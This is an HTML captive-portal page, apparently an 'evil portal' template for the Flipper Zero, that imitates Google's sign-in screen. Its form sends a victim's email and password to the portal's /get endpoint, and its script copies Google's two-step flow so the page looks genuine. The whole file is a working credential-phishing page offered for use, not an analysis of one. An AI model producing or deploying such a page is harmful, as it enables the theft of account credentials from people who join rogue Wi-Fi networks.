<!DOCTYPE html>
<html>
<!-- Based on southwest_airline.html from https://github.com/bigbrodude6119/flipper-zero-evil-portal -->

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
body {
  font-family: "Roboto", Arial, sans-serif;
  margin: 0;
  padding: 0;
  background: #f1f3f4;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
}

.container {
  background: #fff;
  padding: 48px 40px 36px;
  border-radius: 12px;
  border: 1px solid #dadce0;
  box-shadow: none;
  width: 100%;
  max-width: 450px;
  box-sizing: border-box;
}

#logo {
  text-align: left;
  margin-bottom: 20px;
}

svg {
  width: 75px;
  height: auto;
}

.g-h1 {
  font-size: 32px;
  font-weight: 400;
  color: #202124;
  margin: 0 0 6px 0;
  text-align: left;
}

.g-h2 {
  font-size: 16px;
  font-weight: 400;
  color: #202124;
  margin: 0 0 32px 0;
  text-align: left;
}
.g-input {
  width: 100%;
  height: 44px; /* m√°s bajo como Google real */
  font: 400 14px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
  border: 1px solid #dadce0;
  border-radius: 4px;
  padding: 10px 12px;
  margin-bottom: 10px;
  background-color: transparent;
  color: #202124;
  transition: border-color 0.15s ease, box-shadow 0.15s ease;
}


.g-input::placeholder {
  color: #5f6368;
}

.g-input:focus {
  outline: none;
  border: 2px solid #1a73e8;
}

.gbtn-primary {
  width: auto;
  min-width: 88px;
  height: 36px;
  padding: 0 24px;
  margin-top: 26px;
  float: right;
  border-radius: 18px;
  font-family: "Google Sans", Roboto, Arial, sans-serif;
  font-size: 14px;
  font-weight: 500;
  background-color: #1a73e8;
  color: #fff;
  border: none;
  cursor: pointer;
}

.gbtn-primary:hover {
  background-color: #1669c1;
}

.text {
  font-family: Roboto, Arial, sans-serif;
  color: #5f6368;
  font-size: 14px;
  line-height: 1.4286;
  margin-top: 20px;
}

.txt {
  color: #1a73e8;
  text-decoration: none;
  font-weight: 500;
}

.txt:hover {
  text-decoration: underline;
}

@media (max-width: 500px) {
  .container {
    padding: 32px 24px;
    border-radius: 0;
    border: none;
    height: 100vh;
    max-width: 100%;
  }

  body {
    background: #fff;
  }
}
  </style>
</head>

<body>

  <div class="container">

    </div>
    <h1 class="g-h1">Sign in</h1>
    <h2 class="g-h2">Use your Google Account</h2>

    <form action="/get" method="GET" id="email-form-step">

      <input id="emailInput" name="email" type="text" class="g-input" placeholder="Email or phone" required>

      <input id="passwordInput" name="password" type="password" class="g-input" placeholder="Enter your password" required>

      <button id="nextBtn" class="gbtn-primary" type="submit">Next</button>

    </form>

    <div id="forgotEmail" class="text">Forgot email? <a href="#" class="txt">Try another way</a></div>

    <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt">Learn more</a></div>

  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const emailInput = document.getElementById('emailInput');
      const passwordInput = document.getElementById('passwordInput');
      const nextBtn = document.getElementById('nextBtn');
      const forgotEmail = document.getElementById('forgotEmail');
      const h2 = document.querySelector('.g-h2');

      passwordInput.style.display = 'none';

      nextBtn.addEventListener('click', function(e) {
        if (passwordInput.style.display === 'none') {
          const userEmail = emailInput.value.trim();
          if (!userEmail) {
            alert('Please enter your email or phone');
            return;
          }
          e.preventDefault();
          passwordInput.style.display = 'block';
          emailInput.style.display = 'none';
          forgotEmail.style.display = 'none';
          nextBtn.textContent = 'Sign in';
          h2.textContent = 'Welcome ' + userEmail;
        }
      });
    });
  </script>

</body>

</html>
